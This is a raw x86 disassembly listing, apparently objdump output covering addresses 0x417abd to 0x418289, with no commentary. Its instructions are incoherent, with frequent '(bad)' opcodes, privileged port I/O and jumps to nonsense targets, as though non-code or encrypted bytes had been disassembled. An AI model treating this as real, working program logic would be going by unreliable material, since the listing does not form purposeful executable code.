  417abd:	xlat   BYTE PTR ds:[ebx]
  417abe:	shr    DWORD PTR ds:0x55748bf5,1
  417ac4:	in     al,0xd7
  417ac6:	pextrw esp,(bad),0xc5
  417ac8:	daa    
  417ac9:	jmp    0xd75e:0xd48a981a
  417ad0:	adc    eax,0xab98dd2f
  417ad5:	(bad)  
  417ad6:	add    eax,0x6ebbd1f5
  417adb:	inc    eax
  417adc:	out    0x3c,al
  417ade:	or     dl,BYTE PTR ds:0xcaf3dad8
  417ae4:	push   0xd
  417ae6:	neg    DWORD PTR [esi]
  417ae8:	push   cs
  417ae9:	sbb    DWORD PTR [ebx],0xc496bfd6
  417aef:	outs   dx,BYTE PTR ds:[esi]
  417af0:	sub    edx,DWORD PTR [eax+0x6cfe0d78]
  417af6:	scas   eax,DWORD PTR es:[edi]
  417af7:	scas   al,BYTE PTR es:[edi]
  417af8:	or     DWORD PTR [ebx+0x24],ebx
  417afb:	push   ss
  417afc:	fcmovnbe st,st(5)
  417afe:	shl    eax,1
  417b00:	sti    
  417b01:	push   edi
  417b02:	packuswb mm2,QWORD PTR [esi]
  417b05:	push   cs
  417b06:	sbb    al,0xab
  417b08:	ja     0x417aca
  417b0a:	ficomp WORD PTR [esi+0x5479c88b]
  417b10:	arpl   WORD PTR [eax+esi*4-0x2ba775aa],dx
  417b17:	add    DWORD PTR [ebx-0x4d6f1143],esi
  417b1d:	push   es
  417b1e:	and    DWORD PTR [eax+edi*2-0x1762e26d],esp
  417b25:	jae    0x417b57
  417b27:	inc    esp
  417b28:	jg     0x417ae2
  417b2a:	mov    dl,0x52
  417b2c:	mov    bl,0x2d
  417b2e:	aaa    
  417b2f:	sar    DWORD PTR [edi+ebx*4],cl
  417b32:	enter  0x8350,0x33
  417b36:	jo     0x417b02
  417b38:	ja     0x417adf
  417b3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b3b:	mov    bh,0x9
  417b3d:	jns    0x417ad6
  417b3f:	and    esp,ecx
  417b41:	push   ebx
  417b42:	scas   eax,DWORD PTR es:[edi]
  417b43:	inc    ecx
  417b44:	je     0x417bbf
  417b46:	ret    0x2b55
  417b49:	add    al,0xe0
  417b4b:	je     0x417adc
  417b4d:	sub    al,BYTE PTR [edx+0x7909a437]
  417b53:	ret    0x9789
  417b56:	popa   
  417b57:	dec    eax
  417b58:	xor    eax,0x8bca6172
  417b5d:	push   edx
  417b5e:	ins    DWORD PTR es:[edi],dx
  417b5f:	into   
  417b60:	sub    edx,ebp
  417b62:	stos   DWORD PTR es:[edi],eax
  417b63:	pop    ebp
  417b64:	es retf 0xeed4
  417b68:	mov    al,ds:0xc4d6683a
  417b6d:	or     DWORD PTR [ecx+ecx*4+0x4f8b5ae],ebx
  417b74:	iret   
  417b75:	adc    DWORD PTR [esi-0x2b],0x71a8fa37
  417b7c:	mov    ch,0x74
  417b7e:	jg     0x417b1f
  417b80:	xor    eax,esi
  417b82:	pop    esi
  417b83:	xchg   edi,eax
  417b84:	out    0x8d,eax
  417b86:	mov    WORD PTR [ebx],es
  417b88:	mov    ah,0xa8
  417b8a:	mov    DWORD PTR [eax],edx
  417b8c:	imul   esp,ebp,0xcd094913
  417b92:	pop    ebp
  417b93:	jno    0x417b4c
  417b95:	lea    esp,[ebx]
  417b97:	mov    cl,0xd4
  417b99:	push   cs
  417b9a:	mov    DWORD PTR [ecx-0x53],eax
  417b9d:	cwde   
  417b9e:	addr16 mov ebx,0x49d67f57
  417ba4:	popf   
  417ba5:	cmp    DWORD PTR [ebx-0x74562c6e],edx
  417bab:	je     0x417c01
  417bad:	imul   esp,esi,0x8b5cbfb6
  417bb3:	std    
  417bb4:	mov    ecx,0xcd804e99
  417bb9:	cwde   
  417bba:	or     eax,0xadf265d1
  417bbf:	pop    edi
  417bc0:	push   ds
  417bc1:	cli    
  417bc2:	lods   eax,DWORD PTR ds:[esi]
  417bc3:	popf   
  417bc4:	xchg   edi,eax
  417bc5:	sbb    al,0x1f
  417bc7:	add    BYTE PTR [ecx+0x25],cl
  417bca:	sbb    ecx,DWORD PTR [edx+ecx*8]
  417bcd:	std    
  417bce:	int    0xa
  417bd0:	mov    al,ds:0x70e5cc3e
  417bd5:	dec    edi
  417bd6:	int    0xb4
  417bd8:	mov    dl,0x33
  417bda:	mov    ah,0xa2
  417bdc:	mov    edx,0xbac1da06
  417be1:	mov    dh,0xd1
  417be3:	mov    ds:0x395686c6,eax
  417be8:	add    dl,cl
  417bea:	xchg   edx,edi
  417bec:	jmp    FWORD PTR [edx+0x30]
  417bef:	xor    eax,0x81146555
  417bf4:	leave  
  417bf5:	or     ebp,DWORD PTR [ecx-0x5c]
  417bf8:	and    bh,ah
  417bfa:	stc    
  417bfb:	mov    DWORD PTR [ebx+0x28de517f],eax
  417c01:	pop    ss
  417c02:	int3   
  417c03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c04:	fwait
  417c05:	sub    ebp,DWORD PTR [esi+0x41]
  417c08:	lods   eax,DWORD PTR ds:[esi]
  417c09:	call   0x88b65487
  417c0e:	in     eax,dx
  417c0f:	pop    ebp
  417c10:	aad    0xe4
  417c12:	push   es
  417c13:	mov    bl,0x16
  417c15:	inc    BYTE PTR [edx+esi*1-0x36f12167]
  417c1c:	lock lds ebx,FWORD PTR [edi+ebx*8+0x65]
  417c21:	mov    ebx,0xf23dfe84
  417c26:	push   edi
  417c27:	or     al,0xb
  417c29:	mov    gs,ebp
  417c2b:	adc    DWORD PTR [edx+edi*2-0x55],ecx
  417c2f:	test   dh,cl
  417c31:	retf   
  417c32:	stos   BYTE PTR es:[edi],al
  417c33:	sti    
  417c34:	(bad)  
  417c36:	mov    esi,0xac21ae1a
  417c3b:	sar    eax,0xa1
  417c3e:	mov    cl,0x75
  417c40:	aaa    
  417c41:	mov    cl,0x4c
  417c43:	cwde   
  417c44:	push   edx
  417c45:	mov    ecx,0x653a3d28
  417c4a:	neg    DWORD PTR [esp+edi*2+0x7dd4285a]
  417c51:	sbb    DWORD PTR [ebx+0x7e12c216],ebp
  417c57:	cmp    ecx,DWORD PTR [esi+eax*4+0x57]
  417c5b:	cmp    eax,0x624475ea
  417c60:	ror    ebp,1
  417c62:	jbe    0x417c09
  417c64:	fisubr DWORD PTR [edi+0x28b12fcf]
  417c6a:	(bad)  
  417c6b:	rcl    BYTE PTR [ebp-0x5e],cl
  417c6e:	cwd    
  417c70:	sbb    eax,0xcc96aabc
  417c75:	fneni(8087 only) 
  417c77:	shl    edx,0xe0
  417c7a:	(bad)  
  417c7b:	repz ret 
  417c7d:	sbb    dh,bl
  417c7f:	fstp   TBYTE PTR [esi+0x24540c9b]
  417c85:	mov    edx,DWORD PTR [ecx+0x53]
  417c88:	scas   al,BYTE PTR es:[edi]
  417c89:	jp     0x417caf
  417c8b:	stos   DWORD PTR es:[edi],eax
  417c8c:	adc    eax,0x2aee6991
  417c91:	ror    ebx,1
  417c93:	outs   dx,DWORD PTR ds:[esi]
  417c94:	ins    DWORD PTR es:[edi],dx
  417c95:	gs jl  0x417cbd
  417c98:	jmp    0x417c44
  417c9a:	mov    ah,0x79
  417c9c:	loopne 0x417c92
  417c9e:	inc    esp
  417c9f:	lea    esi,[edi+0x31]
  417ca2:	push   ss
  417ca3:	jecxz  0x417cdb
  417ca5:	or     al,0x9e
  417ca7:	aas    
  417ca8:	fwait
  417ca9:	and    BYTE PTR [edx+0x667a28cc],ah
  417caf:	aam    0x34
  417cb1:	inc    esp
  417cb2:	stos   BYTE PTR es:[edi],al
  417cb3:	xor    bl,ch
  417cb5:	jns    0x417cb0
  417cb7:	outs   dx,BYTE PTR ds:[esi]
  417cb8:	ret    
  417cb9:	cli    
  417cba:	test   al,0x28
  417cbc:	cmp    BYTE PTR [ebp+0x2a768b11],bl
  417cc2:	or     DWORD PTR [ebx+0x2],esi
  417cc5:	pusha  
  417cc6:	pop    ds
  417cc7:	mov    ds:0x454af633,eax
  417ccc:	pop    edi
  417ccd:	outs   dx,DWORD PTR ds:[esi]
  417cce:	mov    WORD PTR [edi+0x6e45a2e2],es
  417cd4:	sbb    al,0x67
  417cd6:	retf   
  417cd7:	push   esp
  417cd8:	cmp    BYTE PTR [ebx],bh
  417cda:	mov    cl,0xae
  417cdc:	jmp    0x39e78582
  417ce1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ce2:	pop    ebx
  417ce3:	sbb    dh,al
  417ce5:	iret   
  417ce6:	(bad)  
  417ce7:	push   ds
  417ce8:	push   edi
  417ce9:	mov    ebp,0x71109eb
  417cee:	or     bl,ah
  417cf0:	push   ebp
  417cf1:	pop    ss
  417cf2:	sub    ebp,ebx
  417cf4:	out    0xbf,eax
  417cf6:	in     eax,0x49
  417cf8:	int3   
  417cf9:	mov    ch,0x60
  417cfb:	cmp    DWORD PTR [edi-0x14d41c25],esi
  417d01:	xlat   BYTE PTR ds:[ebx]
  417d02:	mov    cl,0xe3
  417d04:	(bad)  [ebx+0x3e13cdbd]
  417d0a:	cmp    al,0x5b
  417d0c:	(bad)  
  417d0d:	mov    edi,0xe88a24b6
  417d12:	repnz mov bh,0x84
  417d15:	cmp    DWORD PTR [edx*2-0x6a959e8e],ebp
  417d1c:	jne    0x417d67
  417d1e:	mov    bh,0xe4
  417d20:	ror    DWORD PTR [edx-0x6c0ff095],1
  417d26:	ds jne 0x417cd2
  417d29:	xor    eax,0x14956d
  417d2e:	sub    ebx,edx
  417d30:	cmc    
  417d31:	pop    esp
  417d32:	sub    al,0xd1
  417d34:	or     al,0x71
  417d36:	or     BYTE PTR [ebp+0x249967c2],dh
  417d3c:	lds    edx,FWORD PTR [ebp+0x25145bc2]
  417d42:	sub    eax,0xb29d1287
  417d47:	dec    ecx
  417d48:	rcr    DWORD PTR [edx-0x1a],0xe5
  417d4c:	or     DWORD PTR [ebp+0x69a88634],esp
  417d52:	fcomp  QWORD PTR [eax-0x69]
  417d55:	ins    BYTE PTR es:[edi],dx
  417d56:	repz (bad) 
  417d58:	adc    ebp,DWORD PTR [ecx+0x2b]
  417d5b:	out    0x43,al
  417d5d:	pop    esi
  417d5e:	(bad)  
  417d5f:	imul   ebx,DWORD PTR [ecx],0x7c
  417d62:	mov    ebx,0xbcc20d73
  417d67:	mov    ebx,0xa6cf2c64
  417d6c:	lock or eax,DWORD PTR [eax+0x19330745]
  417d73:	pop    ebx
  417d74:	xchg   DWORD PTR [ebx+0x20],ecx
  417d77:	fimul  DWORD PTR [edi]
  417d79:	in     eax,0x4d
  417d7b:	(bad)  
  417d7c:	stos   DWORD PTR es:[edi],eax
  417d7d:	gs push ebx
  417d7f:	lock sub DWORD PTR ss:[edi],eax
  417d83:	inc    edi
  417d84:	pop    ebp
  417d85:	cmc    
  417d86:	mov    DWORD PTR [ebx+ebx*8],edx
  417d89:	cmp    BYTE PTR [ebp-0xf9c5c50],dh
  417d8f:	ins    BYTE PTR es:[edi],dx
  417d90:	mov    cl,0x90
  417d92:	lahf   
  417d93:	test   BYTE PTR [edx+0x137e4d7a],bh
  417d99:	and    BYTE PTR [edi],ah
  417d9b:	in     al,dx
  417d9c:	cli    
  417d9d:	cld    
  417d9e:	jno    0x417d92
  417da0:	cdq    
  417da1:	test   DWORD PTR [eax-0x5d7c524e],esi
  417da7:	mov    dh,0xfd
  417da9:	xor    BYTE PTR [eax+0x29daa04d],cl
  417daf:	std    
  417db0:	mov    eax,ds:0x2a8ee065
  417db5:	out    dx,al
  417db6:	inc    esp
  417db7:	or     eax,0x1a697b44
  417dbc:	push   es
  417dbd:	in     eax,dx
  417dbe:	imul   esi,DWORD PTR [edx+0x57fe729b],0x1aadf81d
  417dc8:	cmp    eax,0xac732be3
  417dcd:	or     al,ch
  417dcf:	xchg   edi,eax
  417dd0:	pop    edi
  417dd1:	stos   DWORD PTR es:[edi],eax
  417dd2:	lds    esp,FWORD PTR [edi+0xc831144]
  417dd8:	fsub   st,st(7)
  417dda:	mov    esi,es
  417ddc:	push   es
  417ddd:	fwait
  417dde:	cmp    BYTE PTR [esi+ecx*2+0x2068f734],ah
  417de5:	jg     0x417e05
  417de7:	mov    ch,0xd2
  417de9:	pop    ebx
  417dea:	jae    0x417d8c
  417dec:	mul    BYTE PTR [edx+0x2c420ac5]
  417df2:	(bad)  
  417df3:	shl    DWORD PTR [edx-0x50],1
  417df6:	pop    edx
  417df7:	push   ss
  417df8:	inc    ebp
  417df9:	mov    bh,0xea
  417dfb:	adc    BYTE PTR [edx],dl
  417dfd:	jmp    0x417ddd
  417dff:	xchg   edx,eax
  417e00:	in     al,dx
  417e01:	pop    ebx
  417e02:	imul   edi,DWORD PTR [ebx],0xffffffe9
  417e05:	sub    eax,0x12edb05e
  417e0a:	inc    esp
  417e0b:	push   cs
  417e0c:	jmp    0xcd6a:0x35975483
  417e13:	mov    bl,0x98
  417e15:	ds xchg edi,eax
  417e17:	mov    esi,0x35c9b3eb
  417e1c:	jo     0x417e7a
  417e1e:	sbb    ebp,DWORD PTR [edx+0x6f]
  417e21:	inc    esi
  417e22:	retf   0xd7ac
  417e25:	aam    0x86
  417e27:	cli    
  417e28:	sbb    DWORD PTR [ecx-0x25],ecx
  417e2b:	fbstp  TBYTE PTR [eax+0x68d841be]
  417e31:	xor    edi,ebp
  417e33:	lea    eax,[edx+0x47]
  417e36:	add    edi,DWORD PTR [edi+esi*2]
  417e39:	sbb    esp,DWORD PTR [ecx]
  417e3b:	mov    esi,0x8f7b85d0
  417e40:	dec    edx
  417e41:	sub    DWORD PTR [edi+ecx*1-0x3e43ddb4],esi
  417e48:	inc    eax
  417e49:	es popf 
  417e4b:	dec    eax
  417e4c:	xchg   ecx,eax
  417e4d:	adc    DWORD PTR [eax-0x1c30f43b],eax
  417e53:	pop    ss
  417e54:	(bad)  
  417e55:	jle    0x417e2b
  417e57:	mov    DWORD PTR [ebx-0x26],eax
  417e5a:	call   0xfb08:0x4a09de29
  417e61:	cwde   
  417e62:	std    
  417e63:	cmp    dh,ch
  417e65:	stos   BYTE PTR es:[edi],al
  417e66:	adc    dh,bl
  417e68:	cwde   
  417e69:	pop    ebx
  417e6a:	sbb    eax,0xd992bd3a
  417e6f:	xchg   edi,eax
  417e70:	sbb    BYTE PTR [edi],0x2
  417e73:	push   eax
  417e74:	in     eax,dx
  417e75:	xchg   ecx,eax
  417e76:	loopne 0x417e7d
  417e78:	pop    ecx
  417e79:	pop    ebx
  417e7a:	rol    BYTE PTR [ecx-0x68],cl
  417e7d:	mov    ch,0x61
  417e7f:	sub    BYTE PTR [edx-0xa],bh
  417e82:	dec    edi
  417e83:	sar    DWORD PTR [ecx],0x2a
  417e86:	cmp    esi,esp
  417e88:	xor    eax,0x7086af3e
  417e8d:	sbb    dl,dl
  417e8f:	mov    edx,0x4cf63c5c
  417e94:	mov    ebp,0x68c06a01
  417e99:	and    eax,0x15409067
  417e9e:	mov    esp,0x1df4ed49
  417ea3:	psrlw  mm5,QWORD PTR [esi+0x19e93994]
  417eaa:	int3   
  417eab:	dec    edx
  417eac:	ret    0xa48a
  417eaf:	add    ax,0x2b68
  417eb3:	repnz lea ecx,[edx-0x329e57c8]
  417eba:	cmp    BYTE PTR [esi+eiz*2-0x592148df],bh
  417ec1:	xor    eax,0x1ed2cbc3
  417ec6:	mov    eax,ds:0x10511364
  417ecb:	and    al,0x99
  417ecd:	ins    BYTE PTR es:[edi],dx
  417ece:	test   BYTE PTR [edx],0xb5
  417ed1:	ja     0x417ea7
  417ed3:	mov    ebx,0x1067322f
  417ed8:	fisubr WORD PTR [ebx+0x25029491]
  417ede:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417edf:	adc    BYTE PTR ds:0xfbed32c3,al
  417ee5:	mov    al,ds:0xdf27f43d
  417eea:	iret   
  417eeb:	and    bl,BYTE PTR [eax-0x30734348]
  417ef1:	cld    
  417ef2:	jle    0x417e75
  417ef4:	cmc    
  417ef5:	lea    eax,[eax+0x3b]
  417ef8:	into   
  417ef9:	ds jae 0x417ec9
  417efc:	dec    esi
  417efd:	jnp    0x417f0d
  417eff:	push   ecx
  417f00:	jnp    0x417eb7
  417f02:	lahf   
  417f03:	sub    DWORD PTR [ebp-0x8afe346],edi
  417f09:	or     ch,BYTE PTR [ebp+0x64]
  417f0c:	push   ss
  417f0d:	scas   eax,DWORD PTR es:[edi]
  417f0e:	push   esp
  417f0f:	mov    esi,0xf53a92f2
  417f14:	xchg   ebx,eax
  417f15:	outs   dx,BYTE PTR ds:[esi]
  417f16:	(bad)  
  417f17:	clc    
  417f18:	cld    
  417f19:	pop    edi
  417f1a:	inc    ecx
  417f1b:	jb     0x417eea
  417f1d:	xor    DWORD PTR [ecx],0xffffffbd
  417f20:	in     al,0x14
  417f22:	sbb    ebx,DWORD PTR [edx]
  417f24:	fmul   DWORD PTR [eax+0x2071d553]
  417f2a:	dec    esi
  417f2b:	outs   dx,BYTE PTR ds:[esi]
  417f2c:	and    al,0x66
  417f2e:	add    ecx,DWORD PTR [ebx+0x7472bf09]
  417f34:	fistp  QWORD PTR [eax+0xcd51803]
  417f3a:	jae    0x417f64
  417f3c:	xchg   ebx,eax
  417f3d:	mov    al,0x26
  417f3f:	neg    BYTE PTR ds:0xfd702f8b
  417f45:	cli    
  417f46:	dec    ebp
  417f47:	out    dx,eax
  417f48:	lods   al,BYTE PTR ds:[esi]
  417f49:	dec    BYTE PTR [esi+0x6]
  417f4c:	mov    al,0x7b
  417f4e:	pushf  
  417f4f:	int3   
  417f50:	fiadd  DWORD PTR [ebp-0x12a6cc2f]
  417f56:	mov    ah,0x57
  417f58:	int    0xae
  417f5a:	push   ecx
  417f5b:	stc    
  417f5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f5d:	mov    ds:0xb5adfc6f,eax
  417f62:	mov    ecx,0x72767f93
  417f67:	out    0xa3,al
  417f69:	cs dec edi
  417f6b:	ret    0x2c11
  417f6e:	sub    bh,al
  417f70:	push   ds
  417f71:	sbb    esp,edx
  417f73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f74:	ins    DWORD PTR es:[edi],dx
  417f75:	outs   dx,BYTE PTR ds:[esi]
  417f76:	adc    eax,0x3358c776
  417f7b:	mov    ds:0x7a72f235,al
  417f80:	leave  
  417f81:	(bad)  
  417f82:	push   ebx
  417f83:	xor    al,BYTE PTR [ecx+0x2]
  417f86:	cmp    eax,0x4fd918fd
  417f8b:	jl     0x417fb6
  417f8d:	shl    DWORD PTR [edi-0x3a],1
  417f90:	std    
  417f91:	cli    
  417f92:	inc    edx
  417f93:	mov    edi,DWORD PTR [ebx+0x4]
  417f96:	push   eax
  417f97:	push   edi
  417f98:	push   edx
  417f99:	call   0x41e026
  417f9e:	shld   edx,eax,0x2
  417fa2:	shl    eax,0x2
  417fa5:	jmp    0x41852f
  417faa:	lods   al,BYTE PTR ds:[esi]
  417fab:	jecxz  0x41802b
  417fad:	sar    BYTE PTR [eax],0x20
  417fb0:	sub    bl,dl
  417fb2:	hlt    
  417fb3:	gs push eax
  417fb5:	je     0x418017
  417fb7:	shl    BYTE PTR [esi+0xc79336e],1
  417fbd:	push   ss
  417fbe:	cmp    eax,0x2a161604
  417fc3:	in     al,dx
  417fc4:	push   cs
  417fc5:	sub    al,0x52
  417fc7:	or     eax,0xcada2b0e
  417fcc:	test   al,0xe6
  417fce:	ins    BYTE PTR es:[edi],dx
  417fcf:	xor    al,BYTE PTR [ebx]
  417fd1:	pop    edx
  417fd2:	lds    edi,FWORD PTR [edi+0x2d2a8297]
  417fd8:	mov    DWORD PTR [esi-0x28d778a5],0x936c77e3
  417fe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fe3:	or     ebp,DWORD PTR [ecx]
  417fe5:	mov    BYTE PTR [eax],al
  417fe7:	cwde   
  417fe8:	add    al,0xf5
  417fea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417feb:	mov    esi,0x3c745712
  417ff0:	or     DWORD PTR [eax-0x5af9600],edi
  417ff6:	dec    edx
  417ff7:	mov    edx,0xa3f68066
  417ffc:	nop
  417ffd:	into   
  417ffe:	enter  0xf223,0xf4
  418002:	leave  
  418003:	xor    al,0x2f
  418005:	jge    0x41806b
  418007:	nop
  418008:	push   ss
  418009:	push   ds
  41800a:	xchg   esp,eax
  41800b:	xchg   edi,eax
  41800c:	in     eax,dx
  41800d:	leave  
  41800e:	xchg   ebx,eax
  41800f:	push   edx
  418010:	cli    
  418011:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418012:	and    BYTE PTR [esi],ah
  418014:	(bad)  
  418015:	ss lods eax,DWORD PTR fs:[esi]
  418018:	xchg   DWORD PTR [edx+0x345879ee],eax
  41801e:	push   ss
  41801f:	or     DWORD PTR [esi-0x3a],0xf64c313d
  418026:	push   ecx
  418027:	cld    
  418028:	(bad)  
  418029:	fs stc 
  41802b:	fcom   QWORD PTR [edx-0x4912c6fd]
  418031:	jns    0x417fc8
  418033:	jns    0x41809b
  418035:	push   ecx
  418036:	iret   
  418037:	(bad)
  41803a:	dec    ecx
  41803b:	vpshlq xmm9,xmm4,[ebx+0x70]
  418041:	in     al,dx
  418042:	mov    DWORD PTR [edi],ebx
  418044:	or     edi,DWORD PTR [edx]
  418046:	or     eax,0xc0848dbc
  41804b:	or     BYTE PTR [edx-0x55],cl
  41804e:	lods   al,BYTE PTR ds:[esi]
  41804f:	stos   BYTE PTR es:[edi],al
  418050:	loop   0x418050
  418052:	mov    dl,0x99
  418054:	test   DWORD PTR [ebp+eiz*4+0x2532be09],ebx
  41805b:	inc    eax
  41805c:	add    BYTE PTR [ecx+0x61ce0752],ch
  418062:	sub    dh,ch
  418064:	mov    DWORD PTR [edi-0x338c0dbe],edi
  41806a:	aam    0xd4
  41806c:	cmp    cl,BYTE PTR [ebx]
  41806e:	into   
  41806f:	push   0x93914741
  418074:	or     eax,0xfc90b1d1
  418079:	xlat   BYTE PTR ds:[ebx]
  41807a:	xor    al,0x3
  41807c:	addr16 mov al,0x25
  41807f:	imul   BYTE PTR [edi]
  418081:	sub    dh,BYTE PTR [ebp+0x2]
  418084:	pop    ecx
  418085:	sub    DWORD PTR [esi],ecx
  418087:	in     al,dx
  418088:	dec    edi
  418089:	sbb    eax,0x4b3a0f7f
  41808e:	shl    ah,cl
  418090:	lds    edx,FWORD PTR [ecx-0x4]
  418093:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418094:	sub    DWORD PTR [edi+0x7f47fe00],ebx
  41809a:	add    DWORD PTR [eax],ebp
  41809c:	fucomi st,st(6)
  41809e:	ss mov ah,0x5a
  4180a1:	jmp    0x418105
  4180a3:	adc    ch,0xe1
  4180a6:	cli    
  4180a7:	jg     0x418065
  4180a9:	retf   
  4180aa:	dec    edx
  4180ab:	xchg   edi,eax
  4180ac:	add    DWORD PTR [ebx+0xf],eax
  4180af:	aam    0xe7
  4180b1:	lahf   
  4180b2:	push   es
  4180b3:	pop    ecx
  4180b4:	nop
  4180b5:	imul   ebp,ebp,0xe3e720bd
  4180bb:	mov    dh,0x9c
  4180bd:	jmp    FWORD PTR [esi]
  4180bf:	inc    ecx
  4180c0:	pop    edi
  4180c1:	(bad)  
  4180c2:	repnz and eax,esi
  4180c5:	fnstenv [edi]
  4180c7:	lods   al,BYTE PTR ds:[esi]
  4180c8:	mov    bh,0x53
  4180ca:	adc    edi,DWORD PTR [edx+0x61]
  4180cd:	mov    DWORD PTR [esi-0x38],esp
  4180d0:	sbb    al,BYTE PTR [ebp+0x3843da68]
  4180d6:	mov    ds:0x99c28489,eax
  4180db:	xor    ebp,DWORD PTR [edx]
  4180dd:	das    
  4180de:	or     DWORD PTR [eax-0x1c5c6116],esi
  4180e4:	retf   
  4180e5:	mov    eax,ds:0x7032c5d2
  4180ea:	(bad)  
  4180eb:	cmp    BYTE PTR [ebp+edx*1-0x6c],al
  4180ef:	jo     0x418137
  4180f1:	dec    edx
  4180f2:	mov    dh,0x7c
  4180f4:	mov    ebx,esp
  4180f6:	push   0x5c
  4180f8:	push   ss
  4180f9:	or     ebx,DWORD PTR [esi+esi*2+0x17574cd1]
  418100:	loopne 0x41816c
  418102:	xchg   esp,eax
  418103:	adc    ecx,esp
  418105:	push   0x164eb5dd
  41810a:	mov    ds:0x6f761c53,ax
  418110:	or     BYTE PTR [edx],ah
  418112:	add    al,0x70
  418114:	jmp    0x1b4a:0x37397567
  41811b:	stos   DWORD PTR es:[edi],eax
  41811c:	inc    edx
  41811d:	xchg   esi,eax
  41811e:	sub    edi,esp
  418120:	inc    esp
  418121:	repz inc eax
  418123:	add    al,0x6
  418125:	add    DWORD PTR [eax],ebx
  418127:	xchg   esp,eax
  418128:	mov    ds:0x1cfb5d3e,eax
  41812d:	out    0x34,al
  41812f:	or     ch,BYTE PTR [edi+0x1d]
  418132:	call   0x5802f74a
  418137:	in     eax,0x77
  418139:	mov    ebx,DWORD PTR [ebx-0x42f6180b]
  41813f:	ret    0x5abc
  418142:	cmovne edi,DWORD PTR [ebx+0x6c207771]
  418149:	popf   
  41814a:	xor    bl,BYTE PTR ds:0x1291407d
  418150:	aam    0x35
  418152:	outs   dx,DWORD PTR ds:[esi]
  418153:	pop    eax
  418154:	and    eax,0xfddb7823
  418159:	dec    esp
  41815a:	cmp    al,0xc0
  41815c:	outs   dx,BYTE PTR ds:[esi]
  41815d:	xor    BYTE PTR [edi+0x49],dl
  418160:	push   es
  418161:	mov    ebx,0xb6bb290d
  418166:	sub    BYTE PTR [edx],ah
  418168:	mov    esi,0x7ab7057e
  41816d:	sub    ch,BYTE PTR [ebx]
  41816f:	and    BYTE PTR [esi+esi*1-0x465e0ec8],dh
  418176:	jle    0x4181e7
  418178:	mov    al,0x95
  41817a:	sub    al,0xb3
  41817c:	and    ebp,DWORD PTR [ebx+0x7b]
  41817f:	out    dx,al
  418180:	inc    ebp
  418181:	je     0x418191
  418183:	dec    ecx
  418184:	sbb    al,0x81
  418186:	std    
  418187:	sahf   
  418188:	add    al,0xf8
  41818a:	repz out dx,al
  41818c:	or     al,0xb3
  41818e:	lods   al,BYTE PTR ds:[esi]
  41818f:	push   esp
  418190:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418191:	movnti DWORD PTR [bx+si-0x7e60],esp
  418197:	(bad)  [edi+0x482651ac]
  41819d:	sub    al,0xc6
  41819f:	add    eax,0xa200b08a
  4181a4:	js     0x41813d
  4181a6:	mov    al,ds:0xf42d2eb3
  4181ab:	ret    0x2055
  4181ae:	sbb    edi,DWORD PTR [eax+0x77c0d35f]
  4181b4:	mov    ecx,0xf61eb224
  4181b9:	out    dx,eax
  4181ba:	sbb    eax,0xe2d34367
  4181bf:	retf   0x34c1
  4181c2:	push   ecx
  4181c3:	pop    edx
  4181c4:	pushf  
  4181c5:	inc    ebx
  4181c6:	add    cl,bl
  4181c8:	aad    0x73
  4181ca:	pop    ebp
  4181cb:	rcl    BYTE PTR [edx-0x2b],cl
  4181ce:	(bad)  
  4181cf:	retf   
  4181d0:	cmc    
  4181d1:	inc    edi
  4181d2:	mov    dh,0x4c
  4181d4:	es mov esi,0x5d6728f9
  4181da:	ret    
  4181db:	add    al,0x32
  4181dd:	pop    edx
  4181de:	push   ss
  4181df:	int3   
  4181e0:	pusha  
  4181e1:	mov    DWORD PTR [eax+edi*2],0xb64814f0
  4181e8:	(bad)  
  4181e9:	test   al,0xd6
  4181eb:	push   ecx
  4181ec:	cwde   
  4181ed:	les    ecx,FWORD PTR [ecx]
  4181ef:	mov    DWORD PTR [ebp+0x4f],edi
  4181f2:	pop    eax
  4181f3:	cmc    
  4181f4:	pop    ebp
  4181f5:	call   0x5f21a816
  4181fa:	loope  0x418260
  4181fc:	xchg   edx,eax
  4181fd:	in     eax,0xe8
  4181ff:	je     0x41826f
  418201:	or     al,0x2d
  418203:	shl    BYTE PTR [eax-0x1a],cl
  418206:	mov    ss,WORD PTR [eax-0x68]
  418209:	add    ah,BYTE PTR [eax]
  41820b:	int    0x30
  41820d:	push   ds
  41820e:	pop    esi
  41820f:	int3   
  418210:	xchg   ebx,eax
  418211:	mov    edx,0x4dfaf641
  418216:	fstp   st(2)
  418218:	lahf   
  418219:	sub    al,0x44
  41821b:	call   0x88da0c75
  418220:	sar    DWORD PTR [ebp-0x1043fd49],0x87
  418227:	(bad)  
  418228:	std    
  418229:	add    al,0x8f
  41822b:	xchg   esp,eax
  41822c:	stc    
  41822d:	fidivr WORD PTR [esi+eiz*8+0x38f7bc39]
  418234:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418235:	(bad)  
  418236:	push   ss
  418237:	xchg   ecx,eax
  418238:	mov    esp,0xcd9e61a1
  41823d:	mov    ecx,0x283cd687
  418242:	xor    al,0x84
  418244:	xchg   esp,eax
  418245:	loope  0x418241
  418247:	mov    ebp,0xca00ffd
  41824c:	rol    ecx,0xee
  41824f:	or     DWORD PTR [esi],eax
  418251:	add    ebp,DWORD PTR [ecx+0x3ca84cbb]
  418257:	gs inc esp
  418259:	icebp  
  41825a:	dec    edi
  41825b:	mov    ebp,0xa05d43c5
  418260:	xor    bl,BYTE PTR [esi-0x3c]
  418263:	dec    esi
  418264:	js     0x4181fb
  418266:	or     BYTE PTR [ebp+0x6a],dh
  418269:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41826a:	mov    edx,0x8ac2e5c0
  41826f:	dec    esi
  418270:	ins    BYTE PTR es:[edi],dx
  418271:	sbb    DWORD PTR [ebx-0xb5bfc10],0x2edcda84
  41827b:	pop    edx
  41827c:	in     al,0x2b
  41827e:	shr    ch,0x29
  418281:	icebp  
  418282:	jp     0x41829e
  418284:	lock sti 
  418286:	gs sub esp,ebp
  418289:	aaa    
